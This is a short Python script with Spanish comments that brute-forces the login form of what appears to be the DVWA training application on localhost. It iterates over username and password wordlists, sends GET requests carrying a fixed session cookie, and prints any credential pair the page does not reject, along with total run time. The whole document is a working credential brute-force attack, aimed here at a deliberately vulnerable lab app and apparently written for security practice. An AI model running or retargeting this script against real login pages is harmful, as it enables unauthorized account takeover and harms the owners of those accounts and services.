import requests
from colorama import Fore, Style
import time

# Definir URL y archivos
url = "http://localhost:4280/vulnerabilities/brute/"
user = './user.txt'
password = './pass.txt'

# Registrar tiempo de inicio
start_time = time.time()

# Recorrer usuarios y contraseñas
for u in open(user):
    for p in open(password):
        response = requests.get(url, params={"username": u.strip(), "password": p.strip(), 
                                             "Login": "Login"}, 
                        headers={"Content-Type": "application/x-www-form-urlencoded", 
                                 "Cookie": "security=low; PHPSESSID=bb22306214fe4dfea3fbe206cd6250a4"})
        
        if "incorrect" not in response.text:
            print(Fore.LIGHTBLUE_EX + f"✓ Contraseña correcta: {u.strip()} -> {p.strip()}" + Style.RESET_ALL)
            break  # Si la contraseña es correcta, salir del bucle de contraseñas

# Registrar tiempo de finalización
end_time = time.time()

# Mostrar tiempo total de ejecución
elapsed_time = end_time - start_time
print(f"\nTiempo total de ejecución: {elapsed_time:.2f} segundos")
